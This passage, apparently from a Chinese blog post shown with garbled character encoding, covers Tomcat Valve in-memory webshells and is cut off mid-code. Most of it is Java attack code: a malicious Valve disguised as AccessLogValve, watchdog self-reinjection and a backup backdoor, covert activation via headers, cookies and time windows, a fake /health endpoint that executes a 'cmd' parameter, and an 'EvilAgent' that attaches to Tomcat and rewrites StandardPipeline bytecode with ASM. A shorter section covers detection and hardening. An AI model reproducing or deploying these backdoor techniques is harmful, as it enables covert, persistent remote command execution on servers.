title="ä¸‰ã€é«˜çº§éšè”½æŠ€æœ¯"></a>ä¸‰ã€é«˜çº§éšè”½æŠ€æœ¯</h3><p><strong>1. Valveä¼ªè£…æŠ€æœ¯</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// ç»§æ‰¿å®˜æ–¹Valveç±»ï¼Œå‡å°‘ç‰¹å¾</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">AccessLogValveProxy</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">AccessLogValve</span> &#123;<br>    <br>    <span class="hljs-keyword">private</span> Valve original;<br>    <span class="hljs-keyword">private</span> Valve malicious;<br>    <br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">AccessLogValveProxy</span><span class="hljs-params">(Valve original)</span> &#123;<br>        <span class="hljs-built_in">this</span>.original = original;<br>        <span class="hljs-built_in">this</span>.malicious = createMaliciousValve();<br>    &#125;<br>    <br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">invoke</span><span class="hljs-params">(Request request, Response response)</span> &#123;<br>        <span class="hljs-comment">// æ¶æ„é€»è¾‘æ£€æŸ¥</span><br>        <span class="hljs-keyword">if</span> (isMaliciousRequest(request)) &#123;<br>            malicious.invoke(request, response);<br>            <span class="hljs-keyword">return</span>;<br>        &#125;<br>        <span class="hljs-comment">// æ­£å¸¸é€»è¾‘</span><br>        original.invoke(request, response);<br>    &#125;<br>    <br>    <span class="hljs-comment">// æ›¿æ¢åŸå§‹Valve</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">replaceOriginalValve</span><span class="hljs-params">(Pipeline pipeline)</span> &#123;<br>        Valve[] valves = pipeline.getValves();<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; valves.length; i++) &#123;<br>            <span class="hljs-keyword">if</span> (valves[i] <span class="hljs-keyword">instanceof</span> AccessLogValve) &#123;<br>                valves[i] = <span class="hljs-keyword">new</span> <span class="hljs-title class_">AccessLogValveProxy</span>(valves[i]);<br>                <span class="hljs-keyword">break</span>;<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="2-è‡ªä¿æŠ¤æœºåˆ¶"><a href="#2-è‡ªä¿æŠ¤æœºåˆ¶" class="headerlink" title="2. è‡ªä¿æŠ¤æœºåˆ¶"></a>2. è‡ªä¿æŠ¤æœºåˆ¶</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// åœ¨Valveä¸­æ·»åŠ è‡ªæ£€å’Œæ¢å¤é€»è¾‘</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">invoke</span><span class="hljs-params">(Request request, Response response)</span> &#123;<br>    <span class="hljs-comment">// 1. æ£€æŸ¥è‡ªèº«æ˜¯å¦ä»åœ¨ç®¡é“ä¸­</span><br>    <span class="hljs-keyword">if</span> (!isValveInPipeline(<span class="hljs-built_in">this</span>)) &#123;<br>        reinjectSelf(); <span class="hljs-comment">// é‡æ–°æ³¨å…¥</span><br>    &#125;<br>    <br>    <span class="hljs-comment">// 2. æ£€æŸ¥å…¶ä»–å†…å­˜é©¬æ˜¯å¦å­˜åœ¨</span><br>    <span class="hljs-keyword">if</span> (!isBackdoorPresent()) &#123;<br>        deploySecondaryBackdoor(); <span class="hljs-comment">// éƒ¨ç½²å¤‡ç”¨åé—¨</span><br>    &#125;<br>    <br>    <span class="hljs-comment">// 3. æ­£å¸¸æ¶æ„é€»è¾‘...</span><br>&#125;<br><br><span class="hljs-comment">// å®šæ—¶æ£€æŸ¥çº¿ç¨‹</span><br><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">startWatchdog</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-keyword">new</span> <span class="hljs-title class_">Thread</span>(() -&gt; &#123;<br>        <span class="hljs-keyword">while</span> (<span class="hljs-literal">true</span>) &#123;<br>            checkValveStatus();<br>            checkSecurityTools();<br>            Thread.sleep(<span class="hljs-number">300000</span>); <span class="hljs-comment">// 5åˆ†é’Ÿæ£€æŸ¥ä¸€æ¬¡</span><br>        &#125;<br>    &#125;).start();<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="3-ä¸Šä¸‹æ–‡æ„ŸçŸ¥è§¦å‘"><a href="#3-ä¸Šä¸‹æ–‡æ„ŸçŸ¥è§¦å‘" class="headerlink" title="3. ä¸Šä¸‹æ–‡æ„ŸçŸ¥è§¦å‘"></a>3. ä¸Šä¸‹æ–‡æ„ŸçŸ¥è§¦å‘</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// åŸºäºè¯·æ±‚ä¸Šä¸‹æ–‡åŠ¨æ€æ¿€æ´»</span><br><span class="hljs-keyword">private</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">shouldActivate</span><span class="hljs-params">(Request request)</span> &#123;<br>    <span class="hljs-comment">// 1. æ£€æŸ¥ç‰¹å®šHeader</span><br>    <span class="hljs-keyword">if</span> (request.getHeader(<span class="hljs-string">&quot;X-Health-Check&quot;</span>) != <span class="hljs-literal">null</span>) <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>    <br>    <span class="hljs-comment">// 2. æ£€æŸ¥ç‰¹æ®ŠURLæ¨¡å¼</span><br>    <span class="hljs-type">String</span> <span class="hljs-variable">uri</span> <span class="hljs-operator">=</span> request.getRequestURI();<br>    <span class="hljs-keyword">if</span> (uri.contains(<span class="hljs-string">&quot;;jsessionid=&quot;</span>)) &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">sessionPart</span> <span class="hljs-operator">=</span> uri.split(<span class="hljs-string">&quot;;&quot;</span>)[<span class="hljs-number">1</span>];<br>        <span class="hljs-keyword">return</span> validateSessionToken(sessionPart);<br>    &#125;<br>    <br>    <span class="hljs-comment">// 3. æ£€æŸ¥ç‰¹å®šCookieå€¼</span><br>    Cookie[] cookies = request.getCookies();<br>    <span class="hljs-keyword">for</span> (Cookie cookie : cookies) &#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-string">&quot;debug_mode&quot;</span>.equals(cookie.getName())) &#123;<br>            <span class="hljs-keyword">return</span> checkCookieSignature(cookie.getValue());<br>        &#125;<br>    &#125;<br>    <br>    <span class="hljs-comment">// 4. æ—¶é—´çª—å£æ¿€æ´»</span><br>    <span class="hljs-type">long</span> <span class="hljs-variable">currentTime</span> <span class="hljs-operator">=</span> System.currentTimeMillis();<br>    <span class="hljs-keyword">return</span> (currentTime % <span class="hljs-number">60000</span>) &lt; <span class="hljs-number">5000</span>; <span class="hljs-comment">// æ¯åˆ†é’Ÿæ¿€æ´»5ç§’</span><br>&#125;<br></code></pre></td></tr></table></figure><h3 id="å››ã€æ£€æµ‹ä¸é˜²å¾¡æ–¹æ¡ˆ"><a href="#å››ã€æ£€æµ‹ä¸é˜²å¾¡æ–¹æ¡ˆ" class="headerlink" title="å››ã€æ£€æµ‹ä¸é˜²å¾¡æ–¹æ¡ˆ"></a>å››ã€æ£€æµ‹ä¸é˜²å¾¡æ–¹æ¡ˆ</h3><p><strong>æ£€æµ‹æŠ€æœ¯</strong></p><ol><li><p><strong>è¿è¡Œæ—¶ç®¡é“åˆ†æ</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">monitorValves</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-type">StandardContext</span> <span class="hljs-variable">ctx</span> <span class="hljs-operator">=</span> getCurrentContext();<br>    <span class="hljs-type">Pipeline</span> <span class="hljs-variable">pipeline</span> <span class="hljs-operator">=</span> ctx.getPipeline();<br>    Valve[] valves = pipeline.getValves();<br><br>    <span class="hljs-keyword">for</span> (Valve valve : valves) &#123;<br>        <span class="hljs-comment">// æ£€æµ‹æœªç­¾åçš„Valve</span><br>        <span class="hljs-keyword">if</span> (!isSigned(valve.getClass())) &#123;<br>            alertSuspiciousValve(valve);<br>        &#125;<br><br>        <span class="hljs-comment">// æ£€æµ‹ç±»åŠ è½½æ¥æº</span><br>        <span class="hljs-keyword">if</span> (valve.getClass().getClassLoader() != ctx.getLoader().getClassLoader()) &#123;<br>            alertForeignClassLoader(valve);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p><strong>å­—èŠ‚ç æ ¡éªŒæŠ€æœ¯</strong></p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm"><span class="hljs-comment"># ä½¿ç”¨jvmtiä»£ç†è¿›è¡Œç±»æ ¡éªŒ</span><br><span class="hljs-keyword">java </span>-agentpath:valve_checker.so=<span class="hljs-keyword">org.apache.catalina.core.StandardPipeline </span>...<br></code></pre></td></tr></table></figure></li></ol><p><strong>é˜²å¾¡ç­–ç•¥</strong></p><ol><li><p><strong>Tomcaté…ç½®åŠ å›º</strong></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-comment">&lt;!-- context.xml --&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">Context</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">Valve</span> <span class="hljs-attr">className</span>=<span class="hljs-string">&quot;org.apache.catalina.valves.ValveSecurityFilter&quot;</span></span><br><span class="hljs-tag">         <span class="hljs-attr">allowedValves</span>=<span class="hljs-string">&quot;org.apache.catalina.valves.*&quot;</span> /&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">Context</span>&gt;</span><br></code></pre></td></tr></table></figure></li><li><p><strong>è¿è¡Œæ—¶ä¿æŠ¤æœºåˆ¶</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ValveProtectionAgent</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">premain</span><span class="hljs-params">(String args, Instrumentation inst)</span> &#123;<br>        inst.addTransformer((loader, className, classBeingRedefined, <br>                protectionDomain, classfileBuffer) -&gt; &#123;<br>            <span class="hljs-keyword">if</span> (<span class="hljs-string">&quot;org/apache/catalina/core/StandardPipeline&quot;</span>.equals(className)) &#123;<br>                <span class="hljs-keyword">return</span> patchPipelineClass(classfileBuffer);<br>            &#125;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>        &#125;);<br>    &#125;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-type">byte</span>[] patchPipelineClass(<span class="hljs-type">byte</span>[] original) &#123;<br>        <span class="hljs-comment">// ä½¿ç”¨ASMæ·»åŠ ç®¡é“ä¿®æ”¹æ£€æŸ¥</span><br>        <span class="hljs-type">ClassReader</span> <span class="hljs-variable">cr</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ClassReader</span>(original);<br>        <span class="hljs-type">ClassWriter</span> <span class="hljs-variable">cw</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ClassWriter</span>(cr, ClassWriter.COMPUTE_FRAMES);<br>        cr.accept(<span class="hljs-keyword">new</span> <span class="hljs-title class_">PipelineCheckAdapter</span>(cw), <span class="hljs-number">0</span>);<br>        <span class="hljs-keyword">return</span> cw.toByteArray();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p><strong>æƒé™æœ€å°åŒ–</strong></p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"># å¯åŠ¨è„šæœ¬æ·»åŠ JVMå‚æ•°<br>-Djava.<span class="hljs-keyword">security</span>.manager \<br>-Djava.<span class="hljs-keyword">security</span>.<span class="hljs-keyword">policy</span>=tomcat.<span class="hljs-keyword">policy</span><br></code></pre></td></tr></table></figure><p><strong>tomcat.policyå†…å®¹</strong>:</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs abnf">grant codeBase <span class="hljs-string">&quot;file:$&#123;catalina.home&#125;/webapps/yourapp/-&quot;</span> &#123;<br>    // ç¦æ­¢Valveä¿®æ”¹æƒé™<br>    permission java.lang.reflect.ReflectPermission <span class="hljs-string">&quot;suppressAccessChecks&quot;</span><span class="hljs-comment">;</span><br>    permission java.lang.RuntimePermission <span class="hljs-string">&quot;accessClassInPackage.org.apache.catalina.core&quot;</span><span class="hljs-comment">;</span><br>&#125;<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure></li></ol><h3 id="äº”ã€æ··åˆæ³¨å…¥çš„æ¼”è¿›è¶‹åŠ¿"><a href="#äº”ã€æ··åˆæ³¨å…¥çš„æ¼”è¿›è¶‹åŠ¿" class="headerlink" title="äº”ã€æ··åˆæ³¨å…¥çš„æ¼”è¿›è¶‹åŠ¿"></a>äº”ã€æ··åˆæ³¨å…¥çš„æ¼”è¿›è¶‹åŠ¿</h3><ol><li><p><strong>æ¨¡å—åŒ–åŠ è½½</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">invoke</span><span class="hljs-params">(Request request, Response response)</span> &#123;<br>    <span class="hljs-keyword">if</span> (isTriggerRequest(request)) &#123;<br>        <span class="hljs-comment">// åŠ¨æ€åŠ è½½åŠ å¯†æ¨¡å—</span><br>        <span class="hljs-type">byte</span>[] encryptedModule = fetchModule(request.getParameter(<span class="hljs-string">&quot;m&quot;</span>));<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">module</span> <span class="hljs-operator">=</span> loadModule(encryptedModule);<br>        executeModule(<span class="hljs-keyword">module</span>, request, response);<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br>    getNext().invoke(request, response);<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p><strong>äº‘ç¯å¢ƒé€‚é…</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// æ£€æµ‹äº‘ç¯å¢ƒå¹¶è°ƒæ•´è¡Œä¸º</span><br><span class="hljs-keyword">if</span> (isRunningInCloud()) &#123;<br>    activateCloudBackdoor();<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    activateTraditionalBackdoor();<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p><strong>APIç½‘å…³é›†æˆ</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// ä¼ªè£…æˆåˆæ³•çš„å¥åº·æ£€æŸ¥ç«¯ç‚¹</span><br><span class="hljs-keyword">if</span> (<span class="hljs-string">&quot;/health&quot;</span>.equals(request.getRequestURI())) &#123;<br>    <span class="hljs-type">String</span> <span class="hljs-variable">action</span> <span class="hljs-operator">=</span> request.getParameter(<span class="hljs-string">&quot;action&quot;</span>);<br>    <span class="hljs-keyword">if</span> (<span class="hljs-string">&quot;exec&quot;</span>.equals(action)) &#123;<br>        executeCommand(request.getParameter(<span class="hljs-string">&quot;cmd&quot;</span>));<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        sendHealthStatus(response); <span class="hljs-comment">// è¿”å›æ­£å¸¸çŠ¶æ€</span><br>    &#125;<br>    <span class="hljs-keyword">return</span>;<br>&#125;<br></code></pre></td></tr></table></figure></li></ol><h3 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h3><p>Tomcat Valveå‹å†…å­˜é©¬çš„æ··åˆæ³¨å…¥æ–¹å¼ä»£è¡¨äº†å½“å‰é«˜çº§å¨èƒçš„å…¸å‹æ‰‹æ³•ï¼š</p><ol><li><strong>APIä¸åå°„çš„ç²¾å‡†ç»“åˆ</strong>- åœ¨ä¿æŒéšè”½æ€§çš„åŒæ—¶æé«˜å¯é æ€§</li><li><strong>ä¸Šä¸‹æ–‡æ„ŸçŸ¥çš„æ”»å‡»é€»è¾‘</strong>- åŸºäºç¯å¢ƒåŠ¨æ€è°ƒæ•´è¡Œä¸º</li><li><strong>å¤šå±‚é˜²å¾¡è§„é¿</strong>- ä»ç±»åŠ è½½åˆ°ç®¡é“æ“ä½œå…¨é¢ä¼ªè£…</li></ol><h2 id="Agent-ASM-Javassist-å­—èŠ‚ç æ³¨å…¥"><a href="#Agent-ASM-Javassist-å­—èŠ‚ç æ³¨å…¥" class="headerlink" title="Agent + ASM&#x2F;Javassist å­—èŠ‚ç æ³¨å…¥"></a>Agent + ASM&#x2F;Javassist å­—èŠ‚ç æ³¨å…¥</h2><h3 id="ä¸€ã€æ”»å‡»æµç¨‹è¯¦è§£"><a href="#ä¸€ã€æ”»å‡»æµç¨‹è¯¦è§£" class="headerlink" title="ä¸€ã€æ”»å‡»æµç¨‹è¯¦è§£"></a>ä¸€ã€æ”»å‡»æµç¨‹è¯¦è§£</h3><p><strong>é˜¶æ®µ1ï¼šAgentæ³¨å…¥ï¼ˆJVMæ¸—é€ï¼‰</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// è·å–ç›®æ ‡Tomcatè¿›ç¨‹PID</span><br>List&lt;VirtualMachineDescriptor&gt; vms = VirtualMachine.list();<br><span class="hljs-keyword">for</span> (VirtualMachineDescriptor vmd : vms) &#123;<br>    <span class="hljs-keyword">if</span> (vmd.displayName().contains(<span class="hljs-string">&quot;catalina&quot;</span>)) &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">pid</span> <span class="hljs-operator">=</span> vmd.id();<br>        <br>        <span class="hljs-comment">// åŠ¨æ€åŠ è½½Agent</span><br>        <span class="hljs-type">VirtualMachine</span> <span class="hljs-variable">vm</span> <span class="hljs-operator">=</span> VirtualMachine.attach(pid);<br>        vm.loadAgent(<span class="hljs-string">&quot;/path/to/agent.jar&quot;</span>, <span class="hljs-string">&quot;injection_params&quot;</span>);<br>        vm.detach();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>é˜¶æ®µ2ï¼šAgentæ ¸å¿ƒé€»è¾‘</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">EvilAgent</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">premain</span><span class="hljs-params">(String args, Instrumentation inst)</span> &#123;<br>        inst.addTransformer(<span class="hljs-keyword">new</span> <span class="hljs-title class_">CriticalClassTransformer</span>());<br>    &#125;<br>    <br>    <span class="hljs-keyword">static</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CriticalClassTransformer</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">ClassFileTransformer</span> &#123;<br>        <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> Set&lt;String&gt; TARGET_CLASSES = Set.of(<br>            <span class="hljs-string">&quot;org.apache.catalina.core.StandardPipeline&quot;</span>,<br>            <span class="hljs-string">&quot;org.apache.catalina.core.StandardContextValve&quot;</span>,<br>            <span class="hljs-string">&quot;org.apache.catalina.valves.AccessLogValve&quot;</span><br>        );<br><br>        <span class="hljs-meta">@Override</span><br>        <span class="hljs-keyword">public</span> <span class="hljs-type">byte</span>[] transform(ClassLoader loader, String className,<br>                               Class&lt;?&gt; classBeingRedefined,<br>                               ProtectionDomain protectionDomain,<br>                               <span class="hljs-type">byte</span>[] classfileBuffer) &#123;<br>            <br>            <span class="hljs-type">String</span> <span class="hljs-variable">dotClassName</span> <span class="hljs-operator">=</span> className.replace(<span class="hljs-string">&#x27;/&#x27;</span>, <span class="hljs-string">&#x27;.&#x27;</span>);<br>            <span class="hljs-keyword">if</span> (TARGET_CLASSES.contains(dotClassName)) &#123;<br>                <span class="hljs-keyword">return</span> modifyClass(dotClassName, classfileBuffer);<br>            &#125;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="äºŒã€å­—èŠ‚ç ä¿®æ”¹æŠ€æœ¯ï¼ˆASMæ ¸å¿ƒå®ç°ï¼‰"><a href="#äºŒã€å­—èŠ‚ç ä¿®æ”¹æŠ€æœ¯ï¼ˆASMæ ¸å¿ƒå®ç°ï¼‰" class="headerlink" title="äºŒã€å­—èŠ‚ç ä¿®æ”¹æŠ€æœ¯ï¼ˆASMæ ¸å¿ƒå®ç°ï¼‰"></a>äºŒã€å­—èŠ‚ç ä¿®æ”¹æŠ€æœ¯ï¼ˆASMæ ¸å¿ƒå®ç°ï¼‰</h3><p><strong>1. StandardPipelineç±»ä¿®æ”¹</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-type">byte</span>[] modifyStandardPipeline(<span class="hljs-type">byte</span>[] origBytecode) &#123;<br>    <span class="hljs-type">ClassReader</span> <span class="hljs-variable">cr</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ClassReader</span>(origBytecode);<br>    <span class="hljs-type">ClassWriter</span> <span class="hljs-variable">cw</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ClassWriter</span>(cr, ClassWriter.COMPUTE_FRAMES);<br>    <br>    cr.accept(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ClassVisitor</span>(Opcodes.ASM9, cw) &#123;<br>        <span class="hljs-meta">@Override</span><br>        <span class="hljs-keyword">public</span> MethodVisitor <span class="hljs-title function_">visitMethod</span><span class="hljs-params">(<span class="hljs-type">int</span> access, String name, </span><br><span class="hljs-params">                                        String desc, String signature, </span><br><span class="hljs-params">                                        String[] exceptions)</span> &#123;<br>            <br>            <span class="hljs-type">MethodVisitor</span> <span class="hljs-variable">mv</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">super</span>.visitMethod(access, name, desc, signature, exceptions);<br>            <br>            <span class="hljs-comment">// åœ¨invokeæ–¹æ³•ä¸­æ¤å…¥é’©å­</span><br>            <span class="hljs-keyword">if</span> (<span class="hljs-string">&quot;invoke&quot;</span>.equals(name) &amp;&amp; <br>                <span class="hljs-string">&quot;(Lorg/apache/catalina/connector/Request;Lorg/apache/catalina/connector/Response;)V&quot;</span>.equals(desc)) &#123;<br>                <br>                <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">MethodVisitor</span>(Opcodes.ASM9, mv) &#123;<br>                    <span class="hljs-meta">@Override</span><br>                    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">visitCode</span><span class="hljs-params">()</span> &#123;<br>                        <span class="hljs-comment">// åœ¨æ–¹æ³•å¼€å§‹å¤„æ’å…¥æ£€æµ‹é€»è¾‘</span><br>                        mv.visitVarInsn(Opcodes.ALOAD, <span class="hljs-number">1</span>);  <span class="hljs-comment">// åŠ è½½Request</span><br>                        mv.visitMethodInsn(Opcodes.INVOKESTATIC, <br>                                          <span class="hljs-string">&quot;com/evil/EmbeddedLogic&quot;</span>, <br>                                          <span class="hljs-string">&quot;checkRequest&quot;</span>, <br>                                          <span class="hljs-string">&quot;(Lorg/apache/catalina/connector/Request;)Z&quot;</span>, <br>                                          <span class="hljs-literal">false</span>);<br>                        <br>                        <span class="hljs-type">Label</span> <span class="hljs-variable">skipLabel</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Label</span>();<br>                        mv.visitJumpInsn(Opcodes.IFEQ, skipLabel);<br>                        <br>                        <span class="hljs-comment">// 